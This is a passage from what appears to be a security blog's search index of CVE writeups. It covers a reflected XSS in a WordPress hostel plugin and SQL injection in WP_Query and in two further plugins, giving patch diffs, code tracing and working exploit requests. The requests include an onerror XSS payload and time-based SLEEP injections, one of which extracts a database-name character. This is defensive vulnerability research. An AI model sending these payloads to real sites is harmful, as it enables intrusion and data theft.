POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patch. The differences are clearly in two files: views/bookings.html.php and controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The parameter ob is directly taken from $_GET['ob'] and echoed into an HTML attribute without escaping, making it vulnerable to Reflected XSS, since an attacker can inject payloads into the query string. Patched Code \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The patch uses esc_attr() to safely encode $_GET['ob'] before echoing into the HTML attribute. Diff showing patched and vulnerable code Source: $_GET['ob'] is client-controlled input from the URL query string. Sink: echoed in an HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e. üëâ Because the source does not go through controller logic, the diff of controllers/bookings.php is less relevant. ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"How it works For $_GET['ob'] to be echoed in the HTML attribute of \u003ca\u003e, the if condition enclosing \u003ca\u003e must be true: \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e üëâ The key condition is if($offset \u003e 0). If true, the XSS can occur regardless of the second condition. The views/bookings.html.php file cannot be accessed directly; it must be included by the controller using include(). The $offset variable is initialized in the controller and passed to the view. Searching the plugin controllers shows that $offset is set in the default branch (listing bookings) of the static manage() method in class WPHostelBookings in controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['dir']) ? 'ASC' : $_GET['dir']; if($dir != 'ASC' and $dir != 'DESC') $dir = 'ASC'; $odir = ($dir == 'ASC') ? 'DESC' : 'ASC'; $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); $count = $wpdb-\u003eget_var(\"SELECT FOUND_ROWS()\"); if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); break; } } } Analysis of $offset $offset comes from the URL parameter $_GET['offset']: Absent ‚Üí defaults to 0 Present ‚Üí cast to integer via intval() $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); Analysis of $page_limit $page_limit is fixed at 20 for pagination $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; This ensures SQL returns up to 20 records starting from $offset. XSS condition in view: The payload displays only if if($offset \u003e 0) ‚Üí requires at least 1 offset Exploit requires at least 2 bookings in the database to render payload The controller passes results to the view using: if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); WPHOSTEL_PATH is the absolute path to the plugin directory. Absolute path to the plugin directory ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Exploit Request with XSS payload GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026offset=1\u0026ob=\"\u003e\u003cimg+src%3D1+onerror%3Dalert%28document.domain%29\u003e HTTP/1.1 Payload \"\u003e\u003cimg src=x onerror=alert(document.domain)\u003e Closes \u003ca\u003e tag with \"\u003e Adds \u003cimg\u003e tag with onerror to trigger JavaScript Uses alert(document.domain) to clearly demonstrate DOM access Result Reflected XSS triggered successfully ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-6234 vulnerability in the WordPress Hostel plugin stems from improper handling of input ($_GET['ob']) before rendering. This allows an attacker to inject Reflected XSS. The patch fixes it by using esc_attr() to escape the input, ensuring untrusted values cannot inject malicious scripts. Key takeaways: Always sanitize input and escape output according to context. In WordPress, leverage built-in functions like sanitize_text_field(), esc_attr(), esc_html(), wp_kses() to mitigate security risks. ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"References XSS Cross-site scripting (XSS) cheat sheet - PortSwigger WordPress Hostel Plugin \u003c 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":" Due to improper data sanitization in WP_Query, it is possible in certain cases to perform an SQL Injection through plugins or themes that use it in a particular way. This vulnerability was patched in WordPress version 5.8.3. Older affected versions were also fixed through security releases going back as far as 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u003c 5.8.3 CVSS severity: High (8.0) ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging WordPress: v5.8.2 (vulnerable) ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Setup ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Required PHP Version WordPress is entirely built in PHP, so the PHP version on the server directly affects its operation: Each PHP version introduces new features and deprecates or removes outdated syntax/functions. If WordPress uses features not supported by an old PHP version ‚Üí syntax errors or execution failure may occur. Conversely, if PHP is too new, some older functions used by WordPress might be deprecated or removed, causing runtime errors. üëâ Therefore, the PHP version must be compatible with the WordPress version. In this analysis, we use PHP 7.4 with WordPress 5.8.2. ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"VSCode Extensions Because WordPress source code is complex, reading it line by line manually is not practical. To assist with debugging and tracing, install the following extensions in VS Code: PHP Extension Pack ‚Üí search keyword: xdebug.php-pack PHP Tools for VS Code ‚Üí search keyword: devsense.phptools-vscode ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Custom Plugin Since this SQLi vulnerability affects the WordPress Core but can only be exploited indirectly through plugins or themes that use WP_Query, we must interact with it via such a plugin or theme. We create a plugin using WP_Query, displaying the SQL query executed through WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Demo plugin for WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters Create a new page with \u003cpage-title\u003e containing the shortcode: [demo_wp_query] üëâ The query will be displayed when visiting http://localhost/\u003cpage-title\u003e Demo page displaying WP_Query output ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:2:3","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Analysis wpdb Core PHP class used by WordPress to directly interact with MySQL. Allows developers to write and execute raw SQL queries. WP_Query An abstraction layer that retrieves post data from the database without writing raw SQL. Developers simply pass an array of parameters (args), and WordPress automatically builds the appropriate SQL. Relationship WP_Query doesn‚Äôt directly query MySQL. Instead, it builds SQL based on the arguments, applies validation/sanitization, and then calls $wpdb to execute it. ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Patch Diff WordPress is an open-source project with a public GitHub repository, meaning all patches are committed openly. To analyze a vulnerability, we can simply review the related commit and observe the code changes. The reference for CVE-2022-21661 links to this commit: Patch diff between versions The vulnerability was fixed in src/wp-includes/class-wp-tax-query.php Vulnerable Code $query['terms'] = array_unique( (array) $query['terms'] ); Casts $query['terms'] to an array and removes duplicates. No type checking or sanitization ‚Äî allowing injection of malicious values into the SQL query. Example: $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e ['1) AND (SELECT SLEEP(5)) # '], 'operator' =\u003e 'IN', ], ], ]; Patched Code if ( 'slug' === $query['field'] || 'name' === $query['field'] ) { $query['terms'] = array_unique( (array) $query['terms'] ); } else { $query['terms'] = wp_parse_id_list( $query['terms'] ); } Added a conditional check based on $query['field']: If it‚Äôs slug or name ‚Üí keep the old behavior. If it‚Äôs an ID ‚Üí use wp_parse_id_list() to cast all elements into an integer array safely. This ensures that for tax_query fields such as term_taxonomy_id and term_id, which correspond to BIGINT UNSIGNED columns, only numeric values are used. mysql\u003e DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"How it works Breakpoint at clean_query start Continue to matching taxonomy query Observe wp_list_pluck overwriting terms Prevent overwrite with early return Payload remains in executed query Flow WP_Query object created WP_Query constructor called get_posts invoked to run query Condition satisfied, get_sql called get_sql returns get_sql_clauses get_sql_clauses calls get_sql_for_query Iterate query array in get_sql_for_query Checks terms, taxonomy, operator keys... Calls get_sql_for_clause Bypass clean_query, payload preserved Payload assigned to $sql\\['where'] Parentheses added to WHERE clause Adds AND and returns SQL get_posts receives SQL Payload merged into $clauses\\['where'] Observe last_query where SQL executes Execution Flow Diagram Execution flow of WP_Query leading to SQLi ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Exploit Replace terms value with an SQLi payload: GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 Response shows delay caused by payload execution ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2022-21661 vulnerability in WordPress Core, prior to version 5.8.3 (affecting versions back to 3.7.37), stems from improper sanitization in WP_Query, leading to a potential SQL Injection vulnerability. ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"References SQL Injection cheat sheet - PortSwigger CVE-2022-21661 Detail ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:6:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Notes ","date":"2025-10-01","objectID":"/2025-10-01-cve-2022-21661/:7:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":" The vulnerability occurs in the Depicter Slider WordPress plugin prior to version 3.6.2. This could allow an attacker to directly interact with your database, potentially leading to data theft or manipulation. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Depicter Slider: v3.6.1 (vulnerable) and v3.6.2 (patched) Diff tool: meld or any other comparison tool to visualize differences between versions ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Analysis The root cause is that the application directly injects data from a GET request into the SQL query without proper sanitization or escaping. ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A notable difference appears in app/src/Controllers/Ajax/LeadsAjaxController.php. index, list, and export are three key functions inside the LeadsAjaxController class. public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } All three functions were patched by replacing Sanitize::textfield with Sanitize::sql, ensuring the 's' parameter is properly sanitized and SQL-escaped. Illustration of patched vs vulnerable code differences ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"How it works To understand how textfield and sql functions behave, search for the keyword function textfield. They likely reside in the same file since both are called from the same class Sanitize. If you have the PHP Intelephense Extension installed in VSCode, you can navigate directly to the function definition using Ctrl + Click. Searching for textfield function in Sanitize class textfield returns data sanitized by sanitize_text_field, while sql returns SQL-escaped data using esc_sql(). public static function sql( $input ) { return esc_sql( $input ); } Since this is an unauthenticated vulnerability, we need to identify which of the three functions are called without any authentication mechanism. Once confirmed, we can trace deeper into the logic to verify potential SQL injection exploitation. Searching directly by function names like index, list, or export may yield too many results. Instead, search for the class name LeadsAjaxController since all functions must be invoked through it. Searching for LeadsAjaxController usage in source code üëâ The LeadsAjaxController is used during Ajax route registration. When a request is sent to /wp-admin/admin-ajax.php?action=action_here\u0026param1=..., WordPress maps the request via handle('LeadsAjaxController@function') to the corresponding method. All three functions are invoked using the GET method, but export includes a csrf-api middleware, so we can exclude it. We‚Äôll focus only on index and list. When analyzing index, we see that $response calls \\Depicter::lead()-\u003eget($args), which internally calls \\Depicter::leadRepository()-\u003egetResults($args). This is the same logic as list, so list is our main tracing point. public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), 'ids' =\u003e Sanitize::textfield($request-\u003equery('ids', '')), 'sources' =\u003e Sanitize::textfield($request-\u003equery('sources', '')), 'dateStart' =\u003e Sanitize::textfield($request-\u003equery('dateStart', '')), 'dateEnd' =\u003e Sanitize::textfield($request-\u003equery('dateEnd', '')), 'order' =\u003e Sanitize::textfield($request-\u003equery('order', 'DESC')), 'orderBy' =\u003e Sanitize::textfield($request-\u003equery('orderBy', 'id')), 'page' =\u003e Sanitize::int($request-\u003equery('page', 1)), 'perPage' =\u003e Sanitize::int($request-\u003equery('perpage', 10)), 'columns' =\u003e Sanitize::textfield($request-\u003equery('columns', '')), 'includeFields' =\u003e Sanitize::textfield($request-\u003equery('includeFields', false)), 'skipCustomFields' =\u003e Sanitize::textfield($request-\u003equery('skipCustomFields', false)) ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } To understand how getResults executes its query, search for function getResults or use Ctrl + Click on getResults. Definition of getResults function in LeadRepository class üëâ Two getResults functions appear. Based on the class name LeadRepository and the leadRepository() function, it‚Äôs likely that Depicter::leadRepository() returns an instance of LeadRepository. The correct function can be confirmed by checking the number of parameters. The if condition shows that when includeFields is empty, getLeadsResults is called. Let‚Äôs look at it: protected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u003elead()-\u003egetTable(); $leads = Lead::new()-\u003eselect( \"{$leadTable}.id\", \"{$leadTable}.source_id\", \"{$leadTable}.content_id\", \"{$leadTable}.content_name\", \"{$leadTable}.created_at\", \"lf.name as fieldName\", \"lf.value as fieldValue\" )-\u003ejoin( \"{$this-\u003eleadField()-\u003egetTable()} AS lf\", \"{$leadTable}.id\", \"=\", \"lf.lead_id\" ); // other logic if( ! empty( $args['s'] ) ){ $search = \"'%\". $args['s'] .\"%'\"; $leads-\u003eappendRawWhere('AND', \"( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\"); } $results = $this-\u003epaginate( $leads, $args ); } Here, the s parameter (which the patch protects) is concatenated directly into the query using appendRawWhere. Part of t","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Detect SQLi Send a GET request with a time-based SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Decoded payload: 999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - This makes part of the query: AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #') Response time showing the payload execution üëâ The delayed response confirms the injection worked. Subquery in FROM clause: The subquery acts as a temporary table, forcing MySQL to execute it first, delaying the main query execution. ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Get First Letter of Database Name To fully dump data, we must first confirm we can extract at least one character of the database name. Send a request with the following SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here SUBSTRING() extracts the first letter of the database name, and IF() triggers SLEEP(5) if the first character equals 0x77 ('w'). Hex encoding (0x77) is used because s originates from a GET parameter and is escaped by magic quotes and sanitize_text_field in WordPress. üëâ The delayed response confirms the first character is indeed w. ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-2011 vulnerability in the WordPress Depicter Slider plugin (prior to version 3.6.2) arises from unvalidated user input being directly injected into SQL queries, leading to SQL Injection. The patch introduces SQL escaping, ensuring injected data is safely encapsulated within '%...%' strings. Key takeaways: Always validate and sanitize user input. Use $wpdb-\u003eprepare() when handling database queries in WordPress. Keep plugins updated and conduct regular security audits to reduce exposure. ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Depicter Slider Plugin \u003c= 3.6.1 is vulnerable to SQL Injection ","date":"2025-09-30","objectID":"/2025-09-30-cve-2025-2011/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":" The vulnerability occurs in the Woocommerce Partial Shipment plugin for WordPress prior to version 3.3. It allows attackers to directly interact with the database, potentially leading to data theft and other attacks. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Woocommerce Partial Shipment: v3.2 (vulnerable) and v3.3 (patched) Diff Tool: meld or any comparison tool to view differences between versions Activated WooCommerce Plugin: must be activated before installing Woocommerce Partial Shipment Plugin, since several WooCommerce functions are used. ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Analysis The root cause lies in directly injecting POST request data into an SQL query without proper sanitization or validation. ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A significant difference appears in wc-partial-shipment/woocommerce-partial-shipment.php. However, since the developer made many changes, locating the vulnerable line can be difficult. In WordPress, for SQLi to occur, the application must interact with the database using the global variable $wpdb. Searching for this keyword inside wc-partial-shipment/woocommerce-partial-shipment.php helps identify possible sinks. Sink location found in source code get_shipment_id and get_wxp_shipment_data are two functions in the WXP_Partial_Shipment class that directly insert user input into SQL queries without validation, making them vulnerable to SQL Injection. Comparison between vulnerable and patched version The patch uses $wpdb-\u003eprepare() to safely construct SQL queries instead of direct string concatenation with user input. This ensures all values are properly escaped before being inserted into the SQL query, effectively mitigating SQL Injection risks. ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"How it works Both get_shipment_id and get_wxp_shipment_data are called by the function wxp_order_set_shipped within the same class. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } üëâ The order_id parameter is taken directly from the POST request, making it user-controlled and allowing it to be passed into vulnerable SQL queries within get_shipment_id and get_wxp_shipment_data. To find where wxp_order_set_shipped is called, search for the keyword wxp_order_set_shipped inside the plugin directory. Location of wxp_order_set_shipped function call wxp_order_set_shipped is registered in the class constructor as a callback for the wp_ajax_wxp_order_set_shipped hook, meaning it can be triggered by authenticated users. üëâ Accessing /wp-admin/admin-ajax.php with the parameters: action=wxp_order_set_shipped\u0026order_id=payload_here will trigger the following: The callback wxp_order_set_shipped executes. order_id is taken directly from the request and inserted into SQL queries. The query executes 